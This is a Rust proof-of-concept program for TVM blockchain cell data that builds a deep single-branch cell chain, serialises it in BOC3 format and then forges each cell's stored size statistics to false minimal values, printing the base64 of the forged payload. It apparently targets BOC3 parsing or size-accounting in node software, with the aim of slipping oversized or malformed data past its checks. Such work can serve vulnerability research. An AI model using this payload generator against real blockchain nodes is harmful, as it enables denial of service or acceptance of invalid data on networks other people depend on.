use base64::{Engine};
use clap::Parser;
use tvm_block::Serializable;
use std::collections::{HashSet, VecDeque};
use std::sync::Arc;
use tvm_types::{BuilderData, Cell};
use tvm_types::{IBitstring};
use tvm_types::{read_boc3_bytes, write_boc3_to_bytes};

#[derive(Parser, Debug)]
struct Args {
    /// Depth of single-branch cell chain to build
    #[arg(long, default_value_t = 1024)]
    depth: usize,

    /// If set, forge stats in-place in BOC3 bytes
    #[arg(long, default_value_t = false)]
    forge: bool,
}

fn build_chain(depth: usize) -> Result<Cell, anyhow::Error> {
    let mut leaf = {
        let mut b = BuilderData::new();
        b.append_u8(24).map_err(|e| anyhow::anyhow!(e.to_string()))?;
        b.into_cell().map_err(|e| anyhow::anyhow!(e.to_string()))?
    };
    for _ in 0..depth {
        let mut b = BuilderData::new();
        b.append_u8(42).map_err(|e| anyhow::anyhow!(e.to_string()))?;
        b.checked_append_reference(leaf).map_err(|e| anyhow::anyhow!(e.to_string()))?;
        leaf = b.into_cell().map_err(|e| anyhow::anyhow!(e.to_string()))?;
    }
    Ok(leaf)
}


fn get_u32_be(buf: &[u8], offset: usize) -> anyhow::Result<u32> {
    if buf.len().saturating_sub(offset) < 4 { anyhow::bail!("short read for u32 at {}", offset); }
    let mut tmp = [0u8; 4];
    tmp.copy_from_slice(&buf[offset..offset + 4]);
    Ok(u32::from_be_bytes(tmp))
}

fn set_u32_be(buf: &mut [u8], offset: usize, value: u32) -> anyhow::Result<()> {
    if buf.len().saturating_sub(offset) < 4 { anyhow::bail!("short write for u32 at {}", offset); }
    buf[offset..offset + 4].copy_from_slice(&value.to_be_bytes());
    Ok(())
}

fn cell_full_len(raw: &[u8]) -> usize {
    if is_big_cell(raw) {
        4 + (((raw[1] as usize) << 16) | ((raw[2] as usize) << 8) | raw[3] as usize)
    } else {
        data_offset(raw) + cell_data_len(raw)
    }
}

fn is_big_cell(buf: &[u8]) -> bool { !buf.is_empty() && buf[0] == 13 }

fn refs_count(buf: &[u8]) -> usize { if is_big_cell(buf) { 0 } else { (buf[0] & 7) as usize } }

fn hashes_count(buf: &[u8]) -> usize {
    let level_mask = if buf.is_empty() { 0 } else { buf[0] >> 5 };
    (level_mask.count_ones() as usize) + 1
}

fn has_stored_hashes(buf: &[u8]) -> bool { !is_big_cell(buf) && (buf[0] & 16) == 16 }

fn data_offset(buf: &[u8]) -> usize {
    if is_big_cell(buf) { 4 } else { 2 + (has_stored_hashes(buf) as usize) * hashes_count(buf) * (32 + 2) }
}

fn cell_data_len(buf: &[u8]) -> usize {
    if is_big_cell(buf) {
        ((buf[1] as usize) << 16) | ((buf[2] as usize) << 8) | buf[3] as usize
    } else {
        let d2 = buf[1];
        (d2 >> 1) as usize + (d2 & 1) as usize
    }
}

fn stats_offset(buf: &[u8]) -> usize { cell_full_len(buf) + refs_count(buf) * 4 }

fn collect_offsets(boc: &[u8], root_offset: usize) -> anyhow::Result<Vec<usize>> {
    let mut stack = VecDeque::new();
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    stack.push_back(root_offset);
    while let Some(off) = stack.pop_back() {
        if !seen.insert(off) { continue; }
        out.push(off);
        let cell_raw = &boc[off..];
        if is_big_cell(cell_raw) { continue; }
        let fl = cell_full_len(cell_raw);
        let rc = refs_count(cell_raw);
        for i in 0..rc {
            let child_rel = get_u32_be(cell_raw, fl + i * 4)? as usize;
            stack.push_back(child_rel);
        }
    }
    Ok(out)
}

fn forge_boc3_stats(buf: &mut [u8]) -> anyhow::Result<()> {
    // Header: magic(4) + roots(4) + roots*4 offsets
    if buf.len() < 8 { anyhow::bail!("BOC too small"); }
    let root_count = get_u32_be(buf, 4)? as usize;
    for i in 0..root_count {
        let rel = get_u32_be(buf, 8 + 4 * i)? as usize;
        let base = 0usize; // offsets are absolute from BOC start
        let root_off = base + rel;
        let offs = collect_offsets(buf, root_off)?;
        for off in offs {
            let cell_raw = &buf[off..];
            if is_big_cell(cell_raw) { continue; }
            let so = off + stats_offset(cell_raw);
            // Set to minimal plausible values: 1 cell, 0 bits
            set_u32_be(buf, so, 1)?;
            set_u32_be(buf, so + 4, 0)?;
        }
    }
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    let mut leaf = {
        build_chain(args.depth)?
    };
    let leaf_bytes = leaf.write_to_bytes().map_err(|e| anyhow::anyhow!(e.to_string()))?;
    let leaf_bytes_base64 = base64::prelude::BASE64_STANDARD.encode(&leaf_bytes);
    println!("{}", leaf_bytes_base64);
    let mut qq = write_boc3_to_bytes(&[leaf.clone()]).map_err(|e| anyhow::anyhow!(e.to_string()))?;
    let qq_base64 = base64::prelude::BASE64_STANDARD.encode(&qq);
    println!("{}", qq_base64);
    let q = read_boc3_bytes(Arc::new(qq.to_vec()), 0).map_err(|e| anyhow::anyhow!(e.to_string()))?;

    let qqlen = qq.len();
    forge_boc3_stats(&mut qq)?;
    qq[qqlen - 14] = 1;
    qq[qqlen - 15] = 0;
    let qq_base64 = base64::prelude::BASE64_STANDARD.encode(&qq);
    println!("{}", qq_base64);
    Ok(())
}
